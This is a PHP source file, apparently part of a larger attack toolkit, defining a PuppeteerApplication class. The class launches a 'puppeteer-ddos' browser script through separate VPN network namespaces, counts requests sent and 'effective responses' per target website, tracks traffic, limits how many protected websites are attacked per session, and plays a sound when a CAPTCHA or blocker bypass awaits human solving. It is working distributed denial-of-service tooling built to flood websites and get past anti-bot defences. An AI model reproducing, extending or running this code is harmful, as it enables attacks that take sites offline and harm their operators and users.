<?php

class PuppeteerApplication extends HackApplication
{
    private $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $stat,
            $stdoutBrokenLineCount,
            $stdoutBuffer,
            $statisticsBadgePreviousRet = '',
            $requireBlockerBypass = 0,
            $workingDirectory,
            $exitCode = -1,
            $debug = true;


    public function processLaunch()
    {

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        //---

        $this->workingDirectory = static::$workingDirectoryRoot . '/VPN' . $this->vpnConnection->getIndex();
        rmdirRecursive($this->workingDirectory);
        mkdir($this->workingDirectory, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chmod($this->workingDirectory, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chown($this->workingDirectory, 'user');
        chgrp($this->workingDirectory, 'user');

        //---

        $command = 'cd "' . __DIR__ . '" ;   '
                 . 'ip netns exec ' . $this->vpnConnection->getNetnsName() . '   '
                 . "nice -n 10   /sbin/runuser  -u user  -g user   --   "
                 . __DIR__ . "/puppeteer-ddos.cli.js  "
                 . "--connection-index=" . $this->vpnConnection->getIndex() . "  --working-directory=\"{$this->workingDirectory}\"  --play-sound=false"
                 . "   2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminateAndKill(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        $this->stat = new \stdClass();
        $this->stat->targets = [];
        $this->stat->total = null;
        return true;
    }

    public function pumpLog() : string
    {
        $ret = $this->log;
        $this->log = '';

        if (!$this->readChildProcessOutput) {
            goto retu;
        }

        //------------------- read stdout -------------------

        $this->stdoutBuffer .= streamReadLines($this->pipes[1], 0);
        // --- Split lines
        $lines = mbSplitLines($this->stdoutBuffer);
        // --- Remove terminal markup
        $lines = array_map('\Term::removeMarkup', $lines);
        // --- Remove empty lines
        $lines = mbRemoveEmptyLinesFromArray($lines);

        foreach ($lines as $lineIndex => $line) {
            $lineObj = json_decode($line);

            if (is_object($lineObj)) {

                unset($lines[$lineIndex]);
                $this->stdoutBrokenLineCount = 0;
                $ret .= $this->processJsonLine($line, $lineObj);

            } else {

                $this->stdoutBrokenLineCount++;
                if ($this->stdoutBrokenLineCount > 3) {
                    $this->stdoutBrokenLineCount = 0;
                    $ret .= $line . "\n";
                    unset($lines[$lineIndex]);
                }
                break;
            }
        }
        $this->stdoutBuffer = implode("\n", $lines);

        retu:
        $ret = mbRTrim($ret);

        return $ret;
    }

    private function processJsonLine($line, $lineObj)
    {
        if (isset($lineObj->requireBlockerBypass)) {
            $this->requireBlockerBypass = $lineObj->requireBlockerBypass;
        }

        if (in_array(val($lineObj, 'type'), ['terminate', 'error'])) {

            $this->stat->targets = [];
            return 'Exit message: ' . val($lineObj, 'message');

        } else if (val($lineObj, 'type') === 'http-get') {

            if (!$this->stat->total) {
                $this->stat->total = new \stdClass();
                $this->stat->total->httpRequestsSent               = 0;
                $this->stat->total->httpEffectiveResponsesReceived = 0;
            }

            $targetItem = $this->stat->targets[$lineObj->entryUrl] ?? null;
            if (!$targetItem) {
                $targetItem = new \stdClass();
                $targetItem->httpRequestsSent = 0;
                $targetItem->httpEffectiveResponsesReceived = 0;
            }

            $this->stat->total->httpRequestsSent++;
                   $targetItem->httpRequestsSent++;

            if (
                /*   !val($lineObj, 'requireBlockerBypass')
                && val($lineObj, 'pageContentLength')  > 512 */
                val($lineObj, 'success')
            ) {
                $this->stat->total->httpEffectiveResponsesReceived++;
                       $targetItem->httpEffectiveResponsesReceived++;
            }

            $this->stat->targets[$lineObj->entryUrl] = $targetItem;

        } else if (!$this->debug) {
            return $this->lineObjectToString($lineObj) . "\n\n";
        }

        if ($this->debug) {
            return $this->lineObjectToString($lineObj) . "\n\n";
        }
    }

    // Should be called after pumpLog()
    public function getStatisticsBadge() : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT, $getStatisticsBadge___previousRet;
        
        if (!count($this->stat->targets)) {
            return null;
        }

        $columnsDefinition = [
            [
                'title' => ['Target'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 15 * 2,
                'trim'  => 4
            ],
            [
                'title' => ['Requests', 'sent'],
                'width' => 15,
                'trim'  => 2,
                'alignRight' => true
            ],
            [
                'title' => ['Effective' , 'responses', 'received'],
                'width' => 15,
                'trim'  => 2,
                'alignRight' => true
            ],
        ];
        $rows[] = [];  // new line

        foreach ($this->stat->targets as $targetName => $targetStat) {
            $row = [
                $targetName,
                $targetStat->httpRequestsSent,
                $targetStat->httpEffectiveResponsesReceived
            ];
            $rows[] = $row;
        }

        $rows[] = [];  // new line
        $rows[] = [
            'Total',
            $this->stat->total->httpRequestsSent,
            $this->stat->total->httpEffectiveResponsesReceived,
        ];

        $ret = mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
        if ($ret === $this->statisticsBadgePreviousRet) {
            return null;
        } else {
            $this->statisticsBadgePreviousRet = $ret;
            return $ret;
        }
    }

    // Should be called after pumpLog()
    public function getEfficiencyLevel()
    {
        $requests  = $this->stat->total->httpRequestsSent                ??  0;
        $responses = $this->stat->total->httpEffectiveResponsesReceived  ??  0;

        if ($requests < 50) {
            return null;
        }

        $averageResponseRate = $responses * 100 / $requests;
        return roundLarge($averageResponseRate);
    }

    // Should be called after pumpLog()
    public function getCurrentCountry()
    {
        return null;
    }

    public function isAlive()
    {
        if (!is_resource($this->process)) {
            return false;
        }
        $this->getExitCode();

        $processStatus = proc_get_status($this->process);
        return $processStatus['running'];
    }

    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);  // Only first call of this function return real value,
                                                           // next calls return -1.
        if ($processStatus['exitcode'] !== -1) {
            $this->exitCode = $processStatus['exitcode'];
        }
        return $this->exitCode;
    }

    public function terminate($hasError)
    {
        if ($this->processPGid) {
            $networkStats = $this->vpnConnection->calculateNetworkStats();
            static::$closedPuppeteerApplicationsNetworkStats->received    += $networkStats->total->received;
            static::$closedPuppeteerApplicationsNetworkStats->transmitted += $networkStats->total->transmitted;
            static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived += $this->stat->total->httpEffectiveResponsesReceived ?? 0;

            // ---

            $this->log("puppeteer-ddos.cli.js terminate PGID -{$this->processPGid}", true);
            @posix_kill(0 - $this->processPGid, SIGTERM);
            // ---
            $subProcessesPids = [];
            getProcessPidWithChildrenPids($this->processPGid, true, $subProcessesPids);
            if (count($subProcessesPids)) {
                $this->log('; browser PIDs:', true);
                foreach ($subProcessesPids as $subProcessPid) {
                    $this->log(' ' . $subProcessPid, true);
                    @posix_kill($subProcessPid, SIGTERM);
                }
            }
        }
    }

    public function kill()
    {
        if ($this->processPGid) {
            $this->log("puppeteer-ddos.cli.js kill PGID -{$this->processPGid}", true);
            @posix_kill(0 - $this->processPGid, SIGKILL);
            // ---
            $subProcessesPids = [];
            getProcessPidWithChildrenPids($this->processPGid, true, $subProcessesPids);
            if (count($subProcessesPids)) {
                $this->log('; browser PIDs:', true);
                foreach ($subProcessesPids as $subProcessPid) {
                    $this->log(' ' . $subProcessPid, true);
                    @posix_kill($subProcessPid, SIGKILL);
                }
            }
        }
        @proc_terminate($this->process, SIGKILL);
        @proc_close($this->process);

        rmdirRecursive($this->workingDirectory);
    }

    public function isWaitingForCaptchaResolution()
    {
        return $this->requireBlockerBypass === 2;
    }

    // ----------------------  Static part of the class ----------------------

    private static int     $puppeteerApplicationStartedDuringThisSession = 0;
    private static string  $workingDirectoryRoot;
    private static int     $lastPlayedCaptchaSound = 0;
    private static object  $closedPuppeteerApplicationsNetworkStats,
                           $runningPuppeteerApplicationsNetworkStats,
                           $runningPuppeteerApplicationsNetworkStatsThisSession;
   private static int      $runningPuppeteerApplicationsCount;

    public static function constructStatic()
    {
        global $TEMP_DIR;
        static::$workingDirectoryRoot = $TEMP_DIR . '/puppeteer-ddos';

        static::$closedPuppeteerApplicationsNetworkStats = new \stdClass();
        static::$closedPuppeteerApplicationsNetworkStats->received = 0;
        static::$closedPuppeteerApplicationsNetworkStats->transmitted = 0;
        static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived = 0;

        static::$runningPuppeteerApplicationsNetworkStats = new \stdClass();
        static::$runningPuppeteerApplicationsNetworkStatsThisSession = new \stdClass();
        static::$runningPuppeteerApplicationsCount = 0;

        rmdirRecursive(static::$workingDirectoryRoot);
        mkdir(static::$workingDirectoryRoot);
        chmod(static::$workingDirectoryRoot, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chown(static::$workingDirectoryRoot, 'user');
        chgrp(static::$workingDirectoryRoot, 'user');

        killZombieProcesses('chrome');
        killZombieProcesses('nodejs');

        Actions::addAction('AfterInitSession',             [static::class, 'actionAfterInitSession']);
        Actions::addAction('BeforeTerminateSession',       [static::class, 'actionBeforeTerminateSession']);
        Actions::addFilter('OpenVpnStatisticsBadge',        [static::class, 'filterOpenVpnStatisticsBadge']);
        Actions::addFilter('OpenVpnStatisticsSessionBadge', [static::class, 'filterOpenVpnStatisticsSessionBadge']);
        Actions::addAction('AfterMainOutputLoopIteration', [static::class, 'actionPlayCaptchaSound']);

    }

    public static function actionAfterInitSession()
    {
        static::$puppeteerApplicationStartedDuringThisSession = 0;
        static::$lastPlayedCaptchaSound = 0;
    }

    public static function actionBeforeTerminateSession()
    {
        static::$runningPuppeteerApplicationsNetworkStats->received = 0;
        static::$runningPuppeteerApplicationsNetworkStats->transmitted = 0;
        static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived = 0;

        static::$runningPuppeteerApplicationsNetworkStatsThisSession->received = 0;
        static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted = 0;

        static::$runningPuppeteerApplicationsCount = 0;

        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
            $networkStats = $puppeteerApplication->vpnConnection->calculateNetworkStats();

            static::$runningPuppeteerApplicationsNetworkStats->received    += $networkStats->total->received;
            static::$runningPuppeteerApplicationsNetworkStats->transmitted += $networkStats->total->transmitted;
            static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived += $puppeteerApplication->stat->total->httpEffectiveResponsesReceived ?? 0;

            static::$runningPuppeteerApplicationsNetworkStatsThisSession->received    += $networkStats->session->received;
            static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted += $networkStats->session->transmitted;

            static::$runningPuppeteerApplicationsCount++;
        }
    }

    public static function filterOpenVpnStatisticsSessionBadge($value)
    {
        if (
                $value
            &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->received
            &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
        ) {
            $value .= OpenVpnStatistics::getTrafficMessage(
                'PuppeteerDDoS session traffic',
                static::$runningPuppeteerApplicationsNetworkStatsThisSession->received,
                static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
            );
            $value .= ', through ' . static::$runningPuppeteerApplicationsCount . ' VPN connection(s)';
            $value .= " \n";
        }
        return $value;
    }

    public static function filterOpenVpnStatisticsBadge($value)
    {
        global $SCRIPT_STARTED_AT;

        $totalReceivedTraffic       = static::$closedPuppeteerApplicationsNetworkStats->received
                                    + static::$runningPuppeteerApplicationsNetworkStats->received;

        $totalTransmittedTraffic    = static::$closedPuppeteerApplicationsNetworkStats->transmitted
                                    + static::$runningPuppeteerApplicationsNetworkStats->transmitted;

        $effectiveResponsesReceived = static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived
                                    + static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived;

        if (
                $value
            &&  $totalReceivedTraffic
            &&  $totalTransmittedTraffic
            &&  $effectiveResponsesReceived
        ) {
            $value .= OpenVpnStatistics::getTrafficMessage(
                'PuppeteerDDoS total traffic',
                $totalReceivedTraffic,
                $totalTransmittedTraffic
            );

            $effectiveResponsesReceivedRate = roundLarge($effectiveResponsesReceived / (time() - $SCRIPT_STARTED_AT));
            $value .= ", $effectiveResponsesReceived effective response(s) received (~$effectiveResponsesReceivedRate per second)\n";
        }
        return $value;
    }

    public static function getNewObject($vpnConnection)
    {
        global $IS_IN_DOCKER, $VBOX_ATTACK_PROTECTED_WEBSITES_PER_SESSION, $PARALLEL_VPN_CONNECTIONS_QUANTITY;

        if ($IS_IN_DOCKER) {
            return false;
        }

        $puppeteerApplicationRunningInstancesCount = count(PuppeteerApplication::getRunningInstances());

        if (
                $VBOX_ATTACK_PROTECTED_WEBSITES_PER_SESSION
            &&  static::$puppeteerApplicationStartedDuringThisSession  <  $VBOX_ATTACK_PROTECTED_WEBSITES_PER_SESSION
            &&  $puppeteerApplicationRunningInstancesCount             <  $PARALLEL_VPN_CONNECTIONS_QUANTITY * 0.33
            &&  $puppeteerApplicationRunningInstancesCount             <  30
        ) {
            static::$puppeteerApplicationStartedDuringThisSession++;
            return new PuppeteerApplication($vpnConnection);
        } else {
            return false;
        }
    }

    public static function actionPlayCaptchaSound()
    {
        if (time() - static::$lastPlayedCaptchaSound < 5 * 60) {
            return;
        }

        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
            if ($puppeteerApplication->isWaitingForCaptchaResolution()) {
                _shell_exec('/usr/bin/music123 /usr/share/sounds/freedesktop/stereo/complete.oga');
                static::$lastPlayedCaptchaSound = time();
                break;
            }
        }
    }

}

PuppeteerApplication::constructStatic();